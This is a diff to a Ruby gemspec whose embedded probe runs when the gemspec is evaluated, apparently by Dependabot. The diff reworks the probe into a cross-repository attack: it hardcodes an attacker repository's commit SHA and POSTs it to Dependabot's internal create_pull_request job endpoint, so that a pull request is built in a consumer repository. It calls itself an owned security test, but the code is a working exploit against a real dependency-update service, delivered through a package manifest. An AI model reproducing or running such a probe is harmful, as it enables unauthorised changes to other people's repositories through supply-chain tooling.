@@ -10,12 +10,13 @@ require "uri"
 # credentials.
 module OwnedDependabotRemoteProbe
   CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
-  # Control case: this is plainly inside Bundler's documented vendor/ allowlist.
-  # If this succeeds while the traversal form fails, the live service is
-  # canonicalizing or rejecting the traversal before PR creation.
-  RAW_PATH = "vendor/owned-dependabot-control.txt"
+  # Cross-repository base-SHA control. This commit exists in the attacker
+  # repository, not in the consumer repository. A secure implementation must
+  # reject it before constructing a Dependabot branch in the consumer.
+  ATTACKER_BASE_SHA = "b86ade7b9af1da5dfad3bec2ee9f1a295c0171f8"
+  RAW_PATH = "vendor/owned-dependabot-cross-repo-base-control.txt"
 
-  CONTROL_CONTENT = "owned-dependabot-authenticated-pr-control\n"
+  CONTROL_CONTENT = "owned-dependabot-cross-repository-base-sha-control\n"
 
   module_function
 
@@ -29,8 +30,7 @@ module OwnedDependabotRemoteProbe
     marker = "/tmp/owned-dependabot-path-traversal-#{job_id}"
     File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}
 
-    base_sha = current_base_sha
-    return if base_sha.to_s.empty?
+    base_sha = ATTACKER_BASE_SHA
 
     endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
     request = Net::HTTP::Post.new(endpoint.request_uri)
@@ -78,9 +78,9 @@ module OwnedDependabotRemoteProbe
     {
       "data" => {
         "dependencies" => [{
-          "name" => "owned_dependabot_remote_probe",
-          "version" => "0.0.2",
-          "previous-version" => "0.0.1",
+          "name" => "owned_dependabot_cross_repo_base_probe",
+          "version" => "0.0.4",
+          "previous-version" => "0.0.3",
           "requirements" => [requirement],
           "previous-requirements" => [requirement],
           "directory" => "/"
@@ -96,9 +96,9 @@ module OwnedDependabotRemoteProbe
           "operation" => "create"
         }],
         "base-commit-sha" => base_sha,
-        "commit-message" => "chore: owned Dependabot authenticated PR control",
-        "pr-title" => "Owned Dependabot authenticated PR control",
-        "pr-body" => "Owned security test: a dependency-controlled gemspec submitted one benign file within Bundler's vendor allowlist."
+        "commit-message" => "chore: owned Dependabot cross-repository base SHA control",
+        "pr-title" => "Owned Dependabot cross-repository base SHA control",
+        "pr-body" => "Owned security test: the supplied base SHA belongs to the attacker repository, not this consumer repository."
       }
     }
   end
@@ -108,7 +108,7 @@ OwnedDependabotRemoteProbe.run
 
 Gem::Specification.new do |spec|
   spec.name = "owned_dependabot_remote_probe"
-  spec.version = "0.0.3"
+  spec.version = "0.0.4"
   spec.summary = "Owned Dependabot security probe"
   spec.authors = ["Owned Security Test"]
   spec.files = []
